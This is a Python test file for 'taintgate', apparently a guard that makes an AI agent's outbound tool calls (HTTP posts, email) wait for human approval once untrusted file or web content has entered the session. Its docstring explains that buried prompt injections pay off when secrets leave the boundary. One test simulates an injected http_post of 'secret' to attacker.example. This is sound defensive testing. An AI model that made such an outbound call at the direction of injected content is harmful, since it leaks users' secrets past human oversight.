"""Open-world / data-egress axis (issue #7).

Risk has two axes, not one. "Destructive" (delete_file) and "exfiltrating"
(http_post, send_email) are different: a buried injection cashes out when
untrusted data picks a destination and secrets leave the boundary. These tests
pin the `egress` rule condition, which composes with `tainted:` through the
existing strictest-wins model, so the two axes combine without per-tool rules.
"""
import pytest

from taintgate import Policy, Session


def make_policy():
    return Policy.from_dict({
        "default": "allow",
        "untrusted_sources": ["read_file", "fetch_url"],
        "egress_tools": ["http_post", "send_email", "fetch_url"],
        "rules": [
            # The composed default: anything open-world, once the session has
            # seen untrusted content, needs a human.
            {"tool": "*", "egress": True, "tainted": True, "action": "ask",
             "reason": "outbound call after untrusted content entered the session"},
        ],
    })


def test_is_egress_classifies_tools():
    p = make_policy()
    assert p.is_egress("http_post")
    assert p.is_egress("send_email")
    assert not p.is_egress("delete_file")
    assert not p.is_egress("read_file")


def test_egress_rule_needs_both_axes():
    p = make_policy()
    s = Session(p, user_messages=["summarise my inbox"])
    # Not tainted yet: egress tool is fine.
    assert p.check("http_post", {"url": "https://x.example"}, s).action == "allow"
    # A destructive-but-local tool never trips the egress rule, tainted or not.
    s.observe("read_file", "…instructions hidden in a file…")
    assert s.tainted
    assert p.check("delete_file", {"path": "/tmp/x"}, s).action == "allow"
    # Egress + tainted together -> ask.
    d = p.check("http_post", {"url": "https://attacker.example", "body": "secret"}, s)
    assert d.action == "ask"
    assert "outbound" in d.reasons[0]


def test_egress_false_matches_only_local_tools():
    p = Policy.from_dict({
        "default": "allow",
        "egress_tools": ["http_post"],
        "rules": [
            {"tool": "*", "egress": False, "action": "deny", "reason": "local only"},
        ],
    })
    assert p.check("delete_file", {}).action == "deny"     # local -> matches egress:false
    assert p.check("http_post", {}).action == "allow"      # open-world -> rule skipped


def test_egress_must_be_bool():
    with pytest.raises(Exception):
        Policy.from_dict({"rules": [{"tool": "x", "action": "ask", "egress": "yes"}]})


def test_unknown_top_level_key_still_rejected():
    with pytest.raises(Exception):
        Policy.from_dict({"egres_tools": ["http_post"], "rules": []})   # typo
